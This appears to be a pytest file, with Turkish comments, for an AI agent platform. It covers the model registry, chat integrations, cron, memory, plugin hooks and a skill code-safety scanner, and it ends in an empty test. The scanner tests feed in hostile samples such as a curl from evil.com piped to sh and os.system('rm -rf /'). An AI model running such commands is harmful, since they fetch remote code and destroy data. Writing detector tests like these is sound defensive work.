"""BÖLÜM 2 guncellemeleri test dosyasi.

LLM, Telegram, Discord, Slack, Cron, Memory,
Plugin, Skill, Browser, Subagent, Session
guncellemelerini test eder.
"""

import os
import re
import time
import pytest
from unittest.mock import AsyncMock, MagicMock, patch


# ============================================================
# 2.1 LLM Model Registry + Unified Client Tests
# ============================================================


class TestLLMModelRegistry:
    """Model kayit defteri guncellemeleri."""

    def test_new_models_registered(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        reg = LLMModelRegistry()
        # Yeni modeller
        assert reg.get("claude-sonnet-4-6-20260214") is not None
        assert reg.get("gpt-5.3-codex") is not None
        assert reg.get("gemini-3.1-pro-preview") is not None
        assert reg.get("grok-3") is not None
        assert reg.get("doubao-pro-256k") is not None
        assert reg.get("cloudflare/llama-3.3-70b") is not None
        assert reg.get("moonshot-v1-128k") is not None
        assert reg.get("vllm/default") is not None

    def test_claude_sonnet_thinking_capability(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        from app.models.unifiedllm_models import ModelCapability
        reg = LLMModelRegistry()
        model = reg.get("claude-sonnet-4-6-20260214")
        assert model is not None
        assert ModelCapability.THINKING in model.capabilities

    def test_gemini_context_1m_capability(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        from app.models.unifiedllm_models import ModelCapability
        reg = LLMModelRegistry()
        model = reg.get("gemini-3.1-pro-preview")
        assert model is not None
        assert ModelCapability.CONTEXT_1M in model.capabilities
        assert model.context_window >= 2_000_000

    def test_clamp_max_tokens(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        reg = LLMModelRegistry()
        # Kisitlama test
        clamped = reg.clamp_max_tokens("claude-sonnet-4-6-20260214", 999999)
        model = reg.get("claude-sonnet-4-6-20260214")
        assert model is not None
        assert clamped <= model.max_output_tokens

    def test_clamp_unknown_model(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        reg = LLMModelRegistry()
        # Bilinmeyen model -> orjinali dondur
        assert reg.clamp_max_tokens("unknown-model", 5000) == 5000

    def test_free_models(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        reg = LLMModelRegistry()
        cf = reg.get("cloudflare/llama-3.3-70b")
        assert cf is not None
        assert cf.input_cost_per_1k == 0.0

        vllm = reg.get("vllm/default")
        assert vllm is not None
        assert vllm.input_cost_per_1k == 0.0

    def test_xai_provider(self):
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        from app.models.unifiedllm_models import LLMProvider
        reg = LLMModelRegistry()
        model = reg.get("grok-3")
        assert model is not None
        assert model.provider == LLMProvider.XAI


class TestUnifiedClient:
    """Unified LLM Client guncellemeleri."""

    def test_build_headers_context_1m(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import LLMRequest, LLMProvider
        client = UnifiedLLMClient()
        req = LLMRequest(
            provider=LLMProvider.ANTHROPIC,
            context_1m=True,
        )
        headers = client._build_headers(req)
        assert "anthropic-beta" in headers

    def test_build_headers_no_context_1m(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import LLMRequest, LLMProvider
        client = UnifiedLLMClient()
        req = LLMRequest(provider=LLMProvider.OPENAI)
        headers = client._build_headers(req)
        assert "anthropic-beta" not in headers

    def test_classify_stop_reason_timeout(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import FinishReason
        client = UnifiedLLMClient()
        assert client._classify_stop_reason("abort") == FinishReason.TIMEOUT
        assert client._classify_stop_reason("timeout") == FinishReason.TIMEOUT
        assert client._classify_stop_reason("cancelled") == FinishReason.TIMEOUT

    def test_classify_stop_reason_stop(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import FinishReason
        client = UnifiedLLMClient()
        assert client._classify_stop_reason("stop") == FinishReason.STOP
        assert client._classify_stop_reason("end_turn") == FinishReason.STOP

    def test_classify_stop_reason_length(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import FinishReason
        client = UnifiedLLMClient()
        assert client._classify_stop_reason("length") == FinishReason.LENGTH
        assert client._classify_stop_reason("max_tokens") == FinishReason.LENGTH

    def test_classify_stop_reason_tool_use(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import FinishReason
        client = UnifiedLLMClient()
        assert client._classify_stop_reason("tool_use") == FinishReason.TOOL_USE
        assert client._classify_stop_reason("tool_calls") == FinishReason.TOOL_USE

    def test_classify_stop_reason_content_filter(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import FinishReason
        client = UnifiedLLMClient()
        assert client._classify_stop_reason("content_filter") == FinishReason.CONTENT_FILTER

    def test_clamp_request_tokens(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.models.unifiedllm_models import LLMRequest
        client = UnifiedLLMClient()
        req = LLMRequest(model="claude-sonnet-4-6-20260214", max_tokens=999999)
        client._clamp_request_tokens(req)
        model = client.get_model_info("claude-sonnet-4-6-20260214")
        if model:
            assert req.max_tokens <= model.max_output_tokens

    def test_probe_primary_unknown(self):
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        client = UnifiedLLMClient()
        assert client._probe_primary("nonexistent") is False


# ============================================================
# 2.2 Telegram Streaming Tests
# ============================================================


class TestTelegramStreamModels:
    """Telegram streaming model guncellemeleri."""

    def test_stream_mode_enum(self):
        from app.models.telegramstream_models import StreamMode
        assert StreamMode.FULL.value == "full"
        assert StreamMode.PARTIAL.value == "partial"
        assert StreamMode.OFF.value == "off"

    def test_stream_lane_enum(self):
        from app.models.telegramstream_models import StreamLane
        assert StreamLane.REASONING.value == "reasoning"
        assert StreamLane.ANSWER.value == "answer"
        assert StreamLane.DRAFT.value == "draft"

    def test_button_style_enum(self):
        from app.models.telegramstream_models import ButtonStyle
        assert ButtonStyle.DEFAULT.value == "default"
        assert ButtonStyle.PRIMARY.value == "primary"
        assert ButtonStyle.SUCCESS.value == "success"
        assert ButtonStyle.DANGER.value == "danger"

    def test_inline_button_model(self):
        from app.models.telegramstream_models import InlineButton, ButtonStyle
        btn = InlineButton(
            text="Click me",
            callback_data="btn_1",
            style=ButtonStyle.PRIMARY,
        )
        assert btn.text == "Click me"
        assert btn.callback_data == "btn_1"
        assert btn.style == ButtonStyle.PRIMARY

    def test_reaction_event_model(self):
        from app.models.telegramstream_models import ReactionEvent
        evt = ReactionEvent(
            chat_id=123,
            message_id=456,
            user_id=789,
            emoji="👍",
            is_add=True,
        )
        assert evt.chat_id == 123
        assert evt.emoji == "👍"
        assert evt.is_add is True

    def test_topic_target_model(self):
        from app.models.telegramstream_models import TopicTarget
        target = TopicTarget(
            chat_id=100,
            topic_id=200,
            thread_id=300,
        )
        assert target.chat_id == 100
        assert target.topic_id == 200

    def test_stream_session_new_fields(self):
        from app.models.telegramstream_models import (
            StreamSession, StreamMode, StreamLane,
        )
        session = StreamSession(
            chat_id=123,
            stream_mode=StreamMode.PARTIAL,
            active_lane=StreamLane.REASONING,
            debounce_chars=50,
            reply_to_message_id=999,
        )
        assert session.stream_mode == StreamMode.PARTIAL
        assert session.active_lane == StreamLane.REASONING
        assert session.debounce_chars == 50
        assert session.reply_to_message_id == 999

    def test_stream_session_defaults(self):
        from app.models.telegramstream_models import (
            StreamSession, StreamMode, StreamLane,
        )
        session = StreamSession()
        assert session.stream_mode == StreamMode.FULL
        assert session.active_lane == StreamLane.ANSWER
        assert session.debounce_chars == 30
        assert session.topic_target is None


# ============================================================
# 2.3 Discord Tests
# ============================================================


class TestDiscordModels:
    """Discord model guncellemeleri."""

    def test_component_type_enum(self):
        from app.models.discord_models import ComponentType
        assert ComponentType.BUTTON.value == "button"
        assert ComponentType.ACTION_ROW.value == "action_row"

    def test_button_style_discord(self):
        from app.models.discord_models import ButtonStyleDiscord
        assert ButtonStyleDiscord.PRIMARY.value == "primary"
        assert ButtonStyleDiscord.DANGER.value == "danger"

    def test_discord_component_model(self):
        from app.models.discord_models import (
            DiscordComponent, ComponentType, ButtonStyleDiscord,
        )
        comp = DiscordComponent(
            component_type=ComponentType.BUTTON,
            label="Test",
            style=ButtonStyleDiscord.SUCCESS,
            allowed_users=["user1"],
        )
        assert comp.component_type == ComponentType.BUTTON
        assert comp.label == "Test"
        assert "user1" in comp.allowed_users

    def test_forum_thread_create(self):
        from app.models.discord_models import ForumThreadCreate
        thread = ForumThreadCreate(
            channel_id="ch_1",
            name="Test Thread",
            content="Hello",
        )
        assert thread.channel_id == "ch_1"
        assert thread.name == "Test Thread"

    def test_ack_reaction_override(self):
        from app.models.discord_models import AckReactionOverride
        ack = AckReactionOverride(
            channel_id="ch_1",
            emoji="✅",
            enabled=True,
        )
        assert ack.emoji == "✅"
        assert ack.enabled is True


# ============================================================
# 2.4 Slack Tests
# ============================================================


class TestSlackModels:
    """Slack model guncellemeleri."""

    def test_slack_stream_state(self):
        from app.models.slack_models import SlackStreamState
        assert SlackStreamState.IDLE.value == "idle"
        assert SlackStreamState.STREAMING.value == "streaming"

    def test_slack_stream_session(self):
        from app.models.slack_models import SlackStreamSession
        session = SlackStreamSession(
            channel_id="C123",
            thread_ts="12345.67",
        )
        assert session.channel_id == "C123"
        assert session.thread_ts == "12345.67"

    def test_slack_ack_reaction(self):
        from app.models.slack_models import SlackAckReaction
        ack = SlackAckReaction(
            channel_id="C123",
            reaction="white_check_mark",
        )
        assert ack.reaction == "white_check_mark"


# ============================================================
# 2.15 Cron Tests
# ============================================================


class TestCronUpdates:
    """Cron zamanlama guncellemeleri."""

    def test_delivery_mode_enum(self):
        from app.models.nlcron_models import DeliveryMode
        assert DeliveryMode.INLINE.value == "inline"
        assert DeliveryMode.WEBHOOK.value == "webhook"

    def test_webhook_delivery_model(self):
        from app.models.nlcron_models import WebhookDelivery
        wh = WebhookDelivery(
            url="https://example.com/hook",
            auth_token="secret",
            timeout_seconds=30,
            ssrf_guard=True,
        )
        assert wh.url == "https://example.com/hook"
        assert wh.ssrf_guard is True

    def test_scheduled_job_new_fields(self):
        from app.models.nlcron_models import ScheduledJob
        job = ScheduledJob(
            name="test",
            max_concurrent_runs=3,
            min_refire_gap_seconds=30,
            timeout_seconds=600,
        )
        assert job.max_concurrent_runs == 3
        assert job.min_refire_gap_seconds == 30
        assert job.timeout_seconds == 600
        assert job.active_runs == 0
        assert job.stagger_ms == 0

    def test_run_record_telemetry_fields(self):
        from app.models.nlcron_models import RunRecord
        rec = RunRecord(
            model_used="claude-3",
            provider_used="anthropic",
            tokens_used=1500,
        )
        assert rec.model_used == "claude-3"
        assert rec.provider_used == "anthropic"
        assert rec.tokens_used == 1500

    def test_concurrent_runs_limit(self):
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.models.nlcron_models import (
            ScheduledJob, JobStatus, RunStatus,
        )
        sched = CronScheduler()
        job = ScheduledJob(
            name="test",
            max_concurrent_runs=1,
            active_runs=1,
        )
        sched.schedule(job)
        rec = sched.execute_job(job.job_id)
        assert rec.status == RunStatus.SKIPPED
        assert "limit" in rec.error_message.lower() or "esanli" in rec.error_message.lower()

    def test_min_refire_gap(self):
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.models.nlcron_models import (
            ScheduledJob, RunStatus,
        )
        sched = CronScheduler()
        job = ScheduledJob(
            name="test",
            min_refire_gap_seconds=3600,
            last_run=time.time(),
        )
        sched.schedule(job)
        rec = sched.execute_job(job.job_id)
        assert rec.status == RunStatus.SKIPPED

    def test_execute_without_concurrent_limit(self):
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.models.nlcron_models import (
            ScheduledJob, RunStatus,
        )
        sched = CronScheduler()
        job = ScheduledJob(
            name="test",
            max_concurrent_runs=5,
        )
        sched.schedule(job)
        rec = sched.execute_job(job.job_id)
        assert rec.status == RunStatus.SUCCESS

    def test_active_runs_decrement(self):
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.models.nlcron_models import ScheduledJob
        sched = CronScheduler()
        job = ScheduledJob(name="test")
        sched.schedule(job)
        sched.execute_job(job.job_id)
        assert job.active_runs == 0

    def test_max_runs_completion(self):
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.models.nlcron_models import (
            ScheduledJob, JobStatus,
        )
        sched = CronScheduler()
        job = ScheduledJob(
            name="test",
            max_runs=1,
        )
        sched.schedule(job)
        sched.execute_job(job.job_id)
        assert job.status == JobStatus.COMPLETED


# ============================================================
# 2.16 Memory Tests
# ============================================================


class TestMemoryUpdates:
    """Memory sistemi guncellemeleri."""

    def test_agent_collection_name(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        name = mem.agent_collection_name("agent-123", "memory")
        assert "agent_" in name
        assert "agent_123" in name
        assert name.startswith("test_")

    def test_agent_collection_name_sanitize(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        name = mem.agent_collection_name("a" * 100, "mem")
        # Truncated to 32
        assert len(name) < 150

    def test_fts_search_basic(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        texts = [
            "Python programming language",
            "JavaScript web development",
            "Python data science",
            "Go systems programming",
        ]
        results = mem.fts_search(texts, "Python")
        assert len(results) == 2
        assert results[0]["score"] > 0

    def test_fts_search_multi_term(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        texts = [
            "Python programming language",
            "Python data science",
            "JavaScript web dev",
        ]
        results = mem.fts_search(texts, "Python data")
        # "Python data science" should score higher
        assert len(results) >= 1
        assert results[0]["score"] > 0

    def test_fts_search_no_match(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        results = mem.fts_search(["hello world"], "xyz")
        assert len(results) == 0

    def test_fts_search_limit(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        texts = [f"item {i} Python" for i in range(20)]
        results = mem.fts_search(texts, "Python", limit=5)
        assert len(results) == 5

    def test_expand_query(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        expanded = mem.expand_query("Python data science")
        assert "Python data science" in expanded
        assert "Python" in expanded
        assert "data" in expanded
        assert "science" in expanded

    def test_expand_query_single_term(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        expanded = mem.expand_query("Python")
        assert expanded == ["Python"]

    def test_embedding_provider(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        assert mem.embedding_provider != ""

    def test_set_embedding_model(self):
        from app.core.memory.semantic import SemanticMemory
        mem = SemanticMemory(prefix="test")
        mem.set_embedding_model("voyage-3", dimension=1024)
        assert mem.embedding_provider == "voyage-3"
        assert mem._embedding_dimension == 1024


# ============================================================
# 2.18 Browser Tests
# ============================================================


class TestBrowserUpdates:
    """Browser model guncellemeleri."""

    def test_ssrf_policy_enum(self):
        from app.models.headless_models import SSRFPolicy
        assert SSRFPolicy.STRICT.value == "strict"
        assert SSRFPolicy.WARN.value == "warn"
        assert SSRFPolicy.OFF.value == "off"

    def test_browser_config_ssrf_default(self):
        from app.models.headless_models import BrowserConfig, SSRFPolicy
        config = BrowserConfig()
        assert config.ssrf_policy == SSRFPolicy.STRICT

    def test_browser_config_gateway_token(self):
        from app.models.headless_models import BrowserConfig
        config = BrowserConfig(gateway_token="secret123")
        assert config.gateway_token == "secret123"

    def test_browser_config_no_sandbox_default(self):
        from app.models.headless_models import BrowserConfig
        config = BrowserConfig()
        assert config.no_sandbox is False

    def test_browser_config_no_sandbox_optin(self):
        from app.models.headless_models import BrowserConfig
        config = BrowserConfig(no_sandbox=True)
        assert config.no_sandbox is True

    def test_browser_config_extra_args(self):
        from app.models.headless_models import BrowserConfig
        config = BrowserConfig(
            extra_args=["--disable-gpu", "--headless=new"],
        )
        assert "--disable-gpu" in config.extra_args


# ============================================================
# 2.14 Subagent Tests
# ============================================================


class TestSubagentModels:
    """Subagent model guncellemeleri."""

    def test_subagent_status_enum(self):
        from app.models.subagent_models import SubagentStatus
        assert SubagentStatus.PENDING.value == "pending"
        assert SubagentStatus.DEPTH_EXCEEDED.value == "depth_exceeded"

    def test_tool_policy_enum(self):
        from app.models.subagent_models import ToolPolicy
        assert ToolPolicy.FULL.value == "full"
        assert ToolPolicy.RESTRICTED.value == "restricted"
        assert ToolPolicy.READ_ONLY.value == "read_only"
        assert ToolPolicy.NONE.value == "none"

    def test_subagent_config_defaults(self):
        from app.models.subagent_models import SubagentConfig, ToolPolicy
        config = SubagentConfig()
        assert config.max_spawn_depth == 3
        assert config.max_children_per_agent == 5
        assert config.context_guard_enabled is True
        assert config.announce_chain is True
        assert config.tool_policy_by_depth[0] == ToolPolicy.FULL
        assert config.tool_policy_by_depth[3] == ToolPolicy.READ_ONLY

    def test_subagent_instance_creation(self):
        from app.models.subagent_models import SubagentInstance
        inst = SubagentInstance(
            parent_id="parent_1",
            name="child_agent",
            depth=1,
            model="claude-3",
        )
        assert inst.parent_id == "parent_1"
        assert inst.depth == 1
        assert inst.agent_id != ""

    def test_subagent_config_custom(self):
        from app.models.subagent_models import SubagentConfig
        config = SubagentConfig(
            max_spawn_depth=5,
            max_children_per_agent=10,
        )
        assert config.max_spawn_depth == 5
        assert config.max_children_per_agent == 10


# ============================================================
# 2.17 Session Tests
# ============================================================


class TestSessionModels:
    """Session model guncellemeleri."""

    def test_session_state_enum(self):
        from app.models.session_models import SessionState
        assert SessionState.ACTIVE.value == "active"
        assert SessionState.LOCKED.value == "locked"
        assert SessionState.ARCHIVED.value == "archived"
        assert SessionState.EXPIRED.value == "expired"

    def test_session_lock_state_enum(self):
        from app.models.session_models import SessionLockState
        assert SessionLockState.UNLOCKED.value == "unlocked"
        assert SessionLockState.WATCHDOG_EXPIRED.value == "watchdog_expired"

    def test_session_entry_defaults(self):
        from app.models.session_models import (
            SessionEntry, SessionState, SessionLockState,
        )
        entry = SessionEntry()
        assert entry.state == SessionState.ACTIVE
        assert entry.lock_state == SessionLockState.UNLOCKED
        assert entry.session_id != ""

    def test_atomic_write_result(self):
        from app.models.session_models import AtomicWriteResult
        result = AtomicWriteResult(
            success=True,
            path="/tmp/test.json",
            bytes_written=1024,
            is_atomic=True,
        )
        assert result.success is True
        assert result.is_atomic is True


# ============================================================
# 2.20 Plugin & Hook Tests
# ============================================================


class TestPluginHookUpdates:
    """Plugin hook guncellemeleri."""

    def test_hook_event_llm_input(self):
        from app.models.plugin import HookEvent
        assert HookEvent.LLM_INPUT.value == "llm_input"

    def test_hook_event_llm_output(self):
        from app.models.plugin import HookEvent
        assert HookEvent.LLM_OUTPUT.value == "llm_output"

    def test_hook_event_before_agent_start(self):
        from app.models.plugin import HookEvent
        assert HookEvent.BEFORE_AGENT_START.value == "before_agent_start"

    def test_hook_event_before_tool_call(self):
        from app.models.plugin import HookEvent
        assert HookEvent.BEFORE_TOOL_CALL.value == "before_tool_call"

    def test_hook_event_before_message_write(self):
        from app.models.plugin import HookEvent
        assert HookEvent.BEFORE_MESSAGE_WRITE.value == "before_message_write"

    @pytest.mark.asyncio
    async def test_emit_transform_empty(self):
        from app.core.plugins.hooks import HookManager
        from app.models.plugin import HookEvent
        hm = HookManager()
        payload = {"messages": [{"role": "user"}]}
        result = await hm.emit_transform(
            HookEvent.LLM_INPUT, payload,
        )
        assert result == payload

    @pytest.mark.asyncio
    async def test_emit_transform_with_handler(self):
        from app.core.plugins.hooks import HookManager
        from app.models.plugin import HookEvent

        async def my_hook(**kwargs):
            msgs = kwargs.get("messages", [])
            msgs.append({"role": "system", "content": "injected"})
            return {"messages": msgs}

        hm = HookManager()
        hm.register(HookEvent.LLM_INPUT, "test_plugin", my_hook)
        result = await hm.emit_transform(
            HookEvent.LLM_INPUT,
            {"messages": [{"role": "user"}]},
        )
        assert len(result["messages"]) == 2
        assert result["messages"][1]["content"] == "injected"

    @pytest.mark.asyncio
    async def test_emit_llm_input(self):
        from app.core.plugins.hooks import HookManager
        hm = HookManager()
        msgs = [{"role": "user", "content": "hello"}]
        result = await hm.emit_llm_input(
            msgs, model="claude-3", provider="anthropic",
        )
        assert result == msgs

    @pytest.mark.asyncio
    async def test_emit_llm_output(self):
        from app.core.plugins.hooks import HookManager
        hm = HookManager()
        content = "AI response"
        result = await hm.emit_llm_output(
            content, model="claude-3",
        )
        assert result == content

    @pytest.mark.asyncio
    async def test_emit_transform_error_isolation(self):
        from app.core.plugins.hooks import HookManager
        from app.models.plugin import HookEvent

        async def bad_hook(**kwargs):
            raise ValueError("broken")

        hm = HookManager()
        hm.register(HookEvent.LLM_INPUT, "bad", bad_hook)
        result = await hm.emit_transform(
            HookEvent.LLM_INPUT,
            {"messages": [{"role": "user"}]},
        )
        # Should not crash, returns original
        assert "messages" in result


# ============================================================
# 2.21 Skill System Tests
# ============================================================


class TestSkillSystemUpdates:
    """Skill sistemi guncellemeleri."""

    def test_compact_path_home(self):
        from app.core.skills.skill_registry import SkillRegistry
        home = os.path.expanduser("~")
        path = os.path.join(home, "projects", "test.py")
        compacted = SkillRegistry.compact_path(path)
        assert compacted.startswith("~")
        assert "projects" in compacted

    def test_compact_path_no_home(self):
        from app.core.skills.skill_registry import SkillRegistry
        path = "/usr/local/bin/test"
        compacted = SkillRegistry.compact_path(path)
        assert compacted == path

    def test_is_symlink_false(self):
        from app.core.skills.skill_registry import SkillRegistry
        assert SkillRegistry.is_symlink(__file__) is False

    def test_reject_symlinks_nonexistent(self):
        from app.core.skills.skill_registry import SkillRegistry
        result = SkillRegistry.reject_symlinks("/nonexistent/dir")
        assert result == []

    def test_scan_code_safety_clean(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "def hello():\n    return 'world'"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) == 0

    def test_scan_code_safety_eval(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "result = eval(user_input)"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) > 0
        assert any("eval" in f["description"] for f in findings)

    def test_scan_code_safety_exec(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "exec(malicious_code)"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) > 0

    def test_scan_code_safety_os_system(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "os.system('rm -rf /')"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) >= 2  # os.system + rm -rf

    def test_scan_code_safety_subprocess(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "subprocess.call(['cmd'])"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) > 0

    def test_scan_code_safety_import(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "__import__('os').system('id')"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) > 0

    def test_scan_code_safety_curl_pipe(self):
        from app.core.skills.skill_registry import SkillRegistry
        code = "curl https://evil.com/script.sh | sh"
        findings = SkillRegistry.scan_code_safety(code)
        assert len(findings) > 0

    def test_register_with_safety_check_clean(self):
        from app.core.skills.skill_registry import SkillRegistry
        from app.core.skills.base_skill import BaseSkill
        reg = SkillRegistry()

        class SafeSkill(BaseSkill):
            SKILL_ID = "SAFE_001"
            NAME = "safe_skill"
            DESCRIPTION = "Safe skill"
            CATEGORY = "test"

            def _execute_impl(self, **params):
                return {"status": "ok"}

        success, findings = reg.register_with_safety_check(
            SafeSkill(),
            source_code="def safe(): return True",
        )
        assert success is True
        assert len(findings) == 0

    def test_register_with_safety_check_unsafe(self):
        from app.core.skills.skill_registry import SkillRegistry
        from app.core.skills.base_skill import BaseSkill
        reg = SkillRegistry()

        class UnsafeSkill(BaseSkill):
            SKILL_ID = "UNSAFE_001"
            NAME = "unsafe_skill"
            DESCRIPTION = "Unsafe skill"
            CATEGORY = "test"

            def _execute_impl(self, **params):
                return {"status": "ok"}

        success, findings = reg.register_with_safety_check(
            UnsafeSkill(),
            source_code="eval(input())",
        )
        assert success is False
        assert len(findings) > 0


# ============================================================
# 2.1 LLM Provider Tests
# ============================================================


class TestLLMProviders:
    """Yeni LLM saglayici modelleri."""

    def test_xai_provider(self):
        from app.models.unifiedllm_models import LLMProvider
        assert LLMProvider.XAI.value == "xai"

    def test_volcano_provider(self):
        from app.models.unifiedllm_models import LLMProvider
        assert LLMProvider.VOLCANO.value == "volcano"

    def test_cloudflare_provider(self):
        from app.models.unifiedllm_models import LLMProvider
        assert LLMProvider.CLOUDFLARE.value == "cloudflare"

    def test_moonshot_provider(self):
        from app.models.unifiedllm_models import LLMProvider
        assert LLMProvider.MOONSHOT.value == "moonshot"

    def test_vllm_provider(self):
        from app.models.unifiedllm_models import LLMProvider
        assert LLMProvider.VLLM.value == "vllm"

    def test_finish_reason_timeout(self):
        from app.models.unifiedllm_models import FinishReason
        assert FinishReason.TIMEOUT.value == "timeout"

    def test_model_capability_thinking(self):
        from app.models.unifiedllm_models import ModelCapability
        assert ModelCapability.THINKING.value == "thinking"

    def test_model_capability_context_1m(self):
        from app.models.unifiedllm_models import ModelCapability
        assert ModelCapability.CONTEXT_1M.value == "context_1m"

    def test_llm_request_context_1m(self):
        from app.models.unifiedllm_models import LLMRequest
        req = LLMRequest(context_1m=True)
        assert req.context_1m is True

    def test_llm_request_thinking_mode(self):
        from app.models.unifiedllm_models import LLMRequest
        req = LLMRequest(thinking_mode="enabled")
        assert req.thinking_mode == "enabled"


# ============================================================
# BÖLÜM 3: Security Updates Tests
# ============================================================


class TestSSRFSecurity:
    """SSRF guvenlik guncellemeleri."""

    def test_ssrf_policy_strict_default(self):
        from app.models.headless_models import BrowserConfig, SSRFPolicy
        config = BrowserConfig()
        assert config.ssrf_policy == SSRFPolicy.STRICT

    def test_webhook_ssrf_guard_default(self):
        from app.models.nlcron_models import WebhookDelivery
        wh = WebhookDelivery()
        assert wh.ssrf_guard is True


class TestPathSecurity:
    """Dosya/path guvenlik guncellemeleri."""

    def test_symlink_rejection(self):
        from app.core.skills.skill_registry import SkillRegistry
        # Test with a known non-symlink
        assert SkillRegistry.is_symlink(__file__) is False

    def test_path_compaction(self):
        from app.core.skills.skill_registry import SkillRegistry
        home = os.path.expanduser("~")
        result = SkillRegistry.compact_path(
            os.path.join(home, "test"),
        )
        assert result.startswith("~")


class TestCodeSafety:
    """Kod guvenlik taramasi."""

    def test_detects_eval(self):
        from app.core.skills.skill_registry import SkillRegistry
        findings = SkillRegistry.scan_code_safety("eval(x)")
        assert len(findings) > 0

    def test_detects_sudo(self):
        from app.core.skills.skill_registry import SkillRegistry
        findings = SkillRegistry.scan_code_safety("sudo apt install")
        assert len(findings) > 0

    def test_detects_chmod_777(self):
        from app.core.skills.skill_registry import SkillRegistry
        findings = SkillRegistry.scan_code_safety("chmod 777 /etc/passwd")
        assert len(findings) > 0

    def test_clean_code_passes(self):
        from app.core.skills.skill_registry import SkillRegistry
        findings = SkillRegistry.scan_code_safety(
            "def add(a, b):\n    return a + b",
        )
        assert len(findings) == 0


class TestHookSecurity:
    """Hook guvenlik guncellemeleri."""

    def test_llm_hooks_available(self):
        from app.models.plugin import HookEvent
        events = [e.value for e in HookEvent]
        assert "llm_input" in events
        assert "llm_output" in events

    @pytest.mark.asyncio
    async def test_transform_handler_isolation(self):
        from app.core.plugins.hooks import HookManager
        from app.models.plugin import HookEvent

        async def crash(**kw):
            raise RuntimeError("crash")

        hm = HookManager()
        hm.register(HookEvent.LLM_INPUT, "bad", crash)
        result = await hm.emit_transform(
            HookEvent.LLM_INPUT,
            {"data": "test"},
        )
        # Hata izolasyonu: payload korunur
        assert result["data"] == "test"


# ============================================================
# Integration Tests
# ============================================================


class TestBolum2Integration:
    """BÖLÜM 2 entegrasyon testleri."""

    def test_all_new_models_importable(self):
        """Tum yeni modeller import edilebilir."""
        from app.models.telegramstream_models import (
            StreamMode, StreamLane, ButtonStyle,
            InlineButton, ReactionEvent, TopicTarget,
        )
        from app.models.discord_models import (
            ComponentType, ButtonStyleDiscord,
            DiscordComponent, ForumThreadCreate,
            AckReactionOverride,
        )
        from app.models.slack_models import (
            SlackStreamState, SlackStreamSession,
            SlackAckReaction,
        )
        from app.models.nlcron_models import (
            DeliveryMode, WebhookDelivery,
        )
        from app.models.headless_models import SSRFPolicy
        from app.models.subagent_models import (
            SubagentStatus, ToolPolicy,
            SubagentConfig, SubagentInstance,
        )
        from app.models.session_models import (
            SessionState, SessionLockState,
            SessionEntry, AtomicWriteResult,
        )
        from app.models.plugin import HookEvent
        assert True

    def test_all_updated_components_importable(self):
        """Tum guncellenmis bilesenler import edilebilir."""
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        from app.core.nlcron.cron_scheduler import CronScheduler
        from app.core.memory.semantic import SemanticMemory
        from app.core.plugins.hooks import HookManager
        from app.core.skills.skill_registry import SkillRegistry
        assert True

    def test_model_registry_stats(self):
        """Model kayit defteri istatistikleri."""
        from app.core.unifiedllm.model_registry import LLMModelRegistry
        reg = LLMModelRegistry()
        stats = reg.get_stats()
        assert stats["total_models"] >= 16  # 8 mevcut + 8 yeni

    def test_cron_scheduler_stats(self):
        """Cron zamanlayici istatistikleri."""
        from app.core.nlcron.cron_scheduler import CronScheduler
        sched = CronScheduler()
        stats = sched.get_stats()
        assert stats["total_jobs"] == 0
        assert stats["total_runs"] == 0

    def test_skill_registry_with_safety(self):
        """Skill registry guvenlik entegrasyonu."""
        from app.core.skills.skill_registry import SkillRegistry
        reg = SkillRegistry()
        # Static methods calismali
        assert isinstance(
            SkillRegistry.scan_code_safety("safe code"),
            list,
        )
        assert isinstance(
            SkillRegistry.compact_path("/tmp/test"),
            str,
        )

    def test_unified_client_stats(self):
        """Unified client istatistikleri."""
